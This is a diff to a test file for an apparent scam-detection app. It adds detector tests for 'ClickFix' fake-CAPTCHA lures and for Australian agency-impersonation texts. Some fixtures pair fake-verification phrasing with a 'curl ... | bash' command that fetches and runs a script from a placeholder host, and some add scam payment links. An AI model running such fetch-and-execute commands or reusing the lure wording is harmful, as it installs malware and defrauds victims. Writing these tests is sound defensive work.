@@ -716,24 +716,90 @@ describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
   it("does not fire on legitimate CLI install instructions (D3 / #143)", () => {
     // The whole point of the co-signal requirement. A README says "run this in
     // Terminal" and stops; it never adds a human-verification framing.
+    //
+    // Asserts the *verdict*, not just the absence of the flag: the terminal
+    // phrasings are also plain requestWords, so a flag-only assertion would pass
+    // while the message still scored its way toward "suspicious".
     const benign = [
       "To install the CLI, open Terminal and run: brew install ripgrep",
       "Install with: curl -fsSL https://get.example.dev/install.sh | sh",
       "Run in terminal: npm install && npm test",
+      "Paste in terminal to set up the dev environment.",
     ];
     for (const text of benign) {
-      const flags = checkCustom(text).flags.join(" | ");
-      expect({ text, hit: flags.includes("macOS ClickFix variant") }).toEqual({ text, hit: false });
+      const r = checkCustom(text);
+      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: false });
+      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
+    }
+  });
+
+  it.each([
+    "Confirm you are not a robot",
+    "I'm not a robot",
+    "Verify you're human",
+    "Prove you are human",
+    "Complete the CAPTCHA",
+    "Human verification required",
+  ])("treats fake-verification phrasing %p as a ClickFix co-signal (D3 / #143)", (framing) => {
+    // Narrowing the clipboard cue made captchaFraming the only co-signal for a
+    // bare `curl | bash`, so it has to cover how the campaigns actually word it —
+    // an earlier revision matched only "i'm not a robot" and silently let
+    // "confirm you are not a robot" through.
+    const r = checkCustom(`${framing}: curl -s https://x.cyou/f.sh | bash`);
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("does not fire on 'robot'/'human' outside a verification framing (D3 / #143)", () => {
+    for (const text of [
+      "Our robot vacuum guide: open Terminal and copy the log.",
+      "The human resources team will copy you on the email.",
+    ]) {
+      const r = checkCustom(text);
+      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: false });
+      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
+    }
+  });
+
+  it("does not fire on copying output out of Terminal (D3 / #143)", () => {
+    // Regression: bare "copy" as a clipboard cue scored this likely_scam (58).
+    // The attack direction is content moving *into* the shell — copying output
+    // out to a support ticket is the opposite, and is ordinary support advice.
+    const r = checkCustom("Open Terminal and copy the output into this support ticket.");
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
+    expect(r.verdict).toBe("safe");
+  });
+
+  it("does not fire on 'spotlight' used as an ordinary noun (D3 / #143)", () => {
+    // Regression: bare "spotlight" as a delivery cue scored this likely_scam
+    // (50). This app publishes scam-awareness copy, so it would flag its own
+    // writing.
+    const r = checkCustom("Our new report puts the spotlight on scam trends. Copy the link to share it.");
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
+    expect(r.verdict).toBe("safe");
+  });
+
+  it("still fires when Spotlight is the launcher (D3 / #143)", () => {
+    // The other half of the narrowed cue — the real lure must still be caught.
+    for (const text of [
+      "Press Spotlight, type Terminal, and paste this to verify you're human.",
+      "Open Spotlight search then paste the command below.",
+    ]) {
+      expect({ text, hit: checkCustom(text).flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: true });
     }
   });
 
   it("scores the macOS ClickFix variant once when both variants appear (D3 / #143)", () => {
     // The Win+R and macOS branches are mutually exclusive, so a cross-platform
-    // lure gets +50, not +100 for one instruction.
+    // lure raises one ClickFix flag, not two for a single instruction.
+    //
+    // The flag count is the assertion that matters: verified by mutation —
+    // flipping the `else if` back to a plain `if` fails this test. A score bound
+    // can't do that job, because both messages already clamp at 100.
     const both = checkSms("Press Win+R (Windows) or Cmd+Space and open Terminal, then paste this command.");
-    const winOnly = checkSms("Press Win+R, then paste this command.");
     expect(both.flags.filter((f) => f.includes("ClickFix")).length).toBe(1);
-    expect(both.score).toBeLessThanOrEqual(winOnly.score + 15);
   });
 
   // ── AU customs / import-duty parcel lures (D2 / #142 / ABF 6 Aug 2026) ─────
@@ -764,6 +830,7 @@ describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
     "Revenue NSW has issued a penalty notice against your vehicle.",
     "Transport NSW: your registration is suspended pending payment.",
     "QLD Transport: unpaid infringement on your account.",
+    "Department of Transport WA: your licence is suspended pending payment.",
     "VCAT has scheduled a hearing regarding your unpaid debt.",
   ])("flags AU state government agency impersonation: %s (D1 / #141)", (text) => {
     const result = checkSms(`${text} Pay now: http://fines-pay.cyou/x`, undefined, "AU");
@@ -788,6 +855,10 @@ describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
     const benign = [
       "The advocate will call you back about the invoice.",
       "Please allocate the remaining budget this week.",
+      // Regression: "dot wa" was a 6-char substring entry, so it matched a
+      // longhand URL and ordinary prose. Replaced by the full agency name.
+      "See site dot washington dot edu for details.",
+      "The dot was red on the delivery map.",
     ];
     for (const text of benign) {
       const flags = checkSms(text, undefined, "AU").flags.join(" | ");
